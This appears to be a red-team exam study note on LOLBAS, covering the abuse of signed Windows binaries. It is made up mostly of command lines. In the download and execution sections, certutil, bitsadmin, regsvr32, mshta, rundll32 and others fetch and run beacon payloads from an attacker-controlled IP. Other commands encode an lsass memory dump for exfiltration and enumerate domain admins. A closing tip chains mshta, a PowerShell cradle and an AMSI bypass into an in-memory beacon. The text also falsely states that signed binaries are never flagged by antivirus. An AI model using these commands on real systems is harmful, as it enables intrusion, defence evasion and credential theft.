# Phase 12: LOLBAS & Native Binary Abuse

> Use Microsoft's own signed binaries to execute payloads. Bypasses application whitelisting and reduces suspicion.

---

## Why LOLBAS Matters for CRTeamer

The exam runs Windows Defender. Custom unsigned binaries get caught. **Signed Microsoft binaries never get flagged by AV** — they're inherently trusted.

Reference: https://lolbas-project.github.io

---

## File Download / Transfer

```powershell
# certutil — download any file (classic, heavily monitored but still works)
certutil.exe -urlcache -split -f http://<your_ip>/beacon.exe C:\Windows\Temp\beacon.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://<your_ip>/beacon.exe C:\Windows\Temp\beacon.exe

# PowerShell (various methods)
(New-Object Net.WebClient).DownloadFile('http://<ip>/beacon.exe','C:\Windows\Temp\beacon.exe')
Invoke-WebRequest -Uri http://<ip>/beacon.exe -OutFile C:\Windows\Temp\beacon.exe
iwr http://<ip>/beacon.exe -o C:\Windows\Temp\beacon.exe

# regsvr32 (downloads and executes DLL/SCT — bypasses AppLocker)
regsvr32.exe /s /n /u /i:http://<ip>/payload.sct scrobj.dll

# mshta (executes HTA — trusted Microsoft binary)
mshta.exe http://<ip>/beacon.hta
mshta.exe "javascript:a=(GetObject('script:http://<ip>/payload.sct')).exec();close();"

# wscript / cscript
wscript.exe \\<ip>\share\payload.vbs
cscript.exe //nologo payload.vbs
```

---

## Execution Without Dropping Files

```powershell
# rundll32 — execute DLL or call exported function
rundll32.exe shell32.dll,ShellExec_RunDLL http://<ip>/beacon.hta
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell");h.run("calc.exe");

# regsvr32 + scrobj.dll — execute remote script (bypasses AppLocker)
regsvr32 /s /n /u /i:http://<ip>/payload.sct scrobj.dll

# forfiles — execute arbitrary command
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c C:\Windows\Temp\beacon.exe"

# pcalua — proxy execution
pcalua.exe -a C:\Windows\Temp\beacon.exe

# odbcconf — execute DLL via REGSVR action
odbcconf.exe /a {REGSVR C:\Windows\Temp\beacon.dll}
```

---

## File Encoding / Exfil

```powershell
# certutil — encode/decode (useful for transferring binary files as text)
certutil -encode C:\Windows\Temp\lsass.dmp C:\Windows\Temp\lsass.b64
# Then copy the b64 text and decode on Kali:
certutil -decode lsass.b64 lsass.dmp
```

---

## LOLBins for Recon

```powershell
# whoami — built-in identity check
whoami /all /priv

# net — user/group/share enumeration (noisy but reliable)
net user /domain
net group "Domain Admins" /domain
net localgroup administrators

# ipconfig / arp / route — network mapping
ipconfig /all
arp -a
route print

# wmic — process and system info (powerful but logged)
wmic process list brief
wmic service list brief
wmic useraccount list full
```

---

## Exam Tip

When Defender is catching your custom tooling — fall back to LOLBins. The combination of:
- `mshta.exe` → delivers PowerShell cradle → AMSI bypass → in-memory beacon

...is reliable and uses only signed Microsoft binaries for delivery. Your actual beacon (Sliver/Havoc) is the only "custom" piece, and that should already be evasive (Phase 02).

---

## Next Step → **Phase 13: PowerShell & .NET Tradecraft** (`13-ps-dotnet.md`)
